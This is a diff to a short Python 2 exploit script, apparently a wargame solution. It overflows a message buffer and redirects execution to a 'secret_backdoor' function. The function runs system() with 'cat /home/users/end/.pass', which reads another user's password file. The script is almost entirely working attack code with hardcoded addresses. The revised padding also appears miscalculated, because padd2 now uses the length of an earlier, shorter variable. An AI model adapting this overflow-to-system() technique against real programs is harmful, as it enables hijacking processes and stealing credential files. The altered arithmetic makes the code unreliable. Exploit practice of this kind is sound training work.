@@ -9,12 +9,20 @@ import struct
 padd = 'a'*0x28
 in1 = padd + '\xd0' + '\n'
 
-# trial and error
+# The fgets in secret_backdoor will fail and return null.
+# So we will be reusing the same chars we wrote in the handle_msg
+# function to pass system().
+
+# First padd 0x48 because the diff between
+# handle_msg 0xc0 and secret_backddor 0x80 is
+# 0x40 plus 8 for the rbp.
+padd1 = 'a'*0x48
+# Then add the string that we will be (rbp-0x80) passed
+# to the system call.
+system = 'cat /home/users/end/.pass '
 # handl_msg sub rsp,0xc0
-padd = 'a'*0x48
-padd += 'cat /home/users/end/.pass '
-padd += 'b'*(0xc0 - len(padd) + 8)
-secret_backdoor_addr = 0x000055555555488c
-in2 = padd + struct.pack("<q", secret_backdoor_addr)
+padd2 = 'b'*(0xc0 - len(padd) + 8)
+secret_backdoor_addr = struct.pack("<q", 0x000055555555488c)
+in2 = padd1 + system + padd2 + secret_backdoor_addr
 
 print in1 + in2
